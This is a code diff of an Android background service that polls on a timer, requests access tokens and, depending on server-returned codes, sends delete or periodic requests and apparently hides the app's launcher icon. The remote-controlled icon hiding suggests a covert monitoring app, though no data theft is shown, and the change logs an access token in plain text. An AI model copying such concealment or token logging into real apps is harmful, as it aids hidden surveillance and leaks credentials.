@@ -39,8 +39,8 @@ public class Request4 extends Service {
 				.getDefaultSharedPreferences(this);
 		Calendar cal = Calendar.getInstance();
 		cal.add(Calendar.MINUTE,
-				Integer.parseInt(sp.getString("period", period)));// через
-																	// period
+				Integer.parseInt(sp.getString("period_request", period)));// через
+		// period
 		// минут
 
 		PendingIntent servicePendingIntent = PendingIntent.getService(this,
@@ -81,9 +81,6 @@ public class Request4 extends Service {
 			if (code.equals("-1") || code.equals("1")) {
 				RequestList.sendCheckRequest(this);
 			}
-			// if (code.equals("1")) {
-			// RequestList.sendCheckRequest(this);
-			// }
 
 			if (code.equals("2")) {
 				if (!sp.getBoolean("hideIcon", false)) {
@@ -98,7 +95,9 @@ public class Request4 extends Service {
 				}
 			}
 			if (code.equals("3")) {
-				RequestList.sendDelRequest(this);
+				RequestList.sendRequestForFirstToken(this);
+				if (sp.getString("scope", "-1").equals("client"))
+					RequestList.sendDelRequest(this);
 			}
 			if (code.equals("0")) {
 				Logging.doLog(LOG_TAG, "code : 0", "code : 0");
@@ -138,15 +137,15 @@ public class Request4 extends Service {
 			// --------second token request------------------------------
 			if (code.equals("1")) {
 				code = sp.getString("access_second_token", "-1");
+				Logging.doLog(LOG_TAG, "access_second_token: " + code,
+						"access_second_token: " + code);
+
 				if (code.equals("-1")) {
 					RequestList.sendRequestForSecondToken(this);
 
-				} else if (code.equals("1")) {
-					Logging.doLog(LOG_TAG,
-							"access_second_token: start periodical",
-							"access_second_token: start periodical");
+				} else if (!code.equals("-1")) {
 					Editor ed = sp.edit();
-					ed.putString("period", periodAfterRegistration);
+					ed.putString("period_request", periodAfterRegistration);
 					ed.commit();
 					RequestList.sendPeriodicRequest(this);
 				}
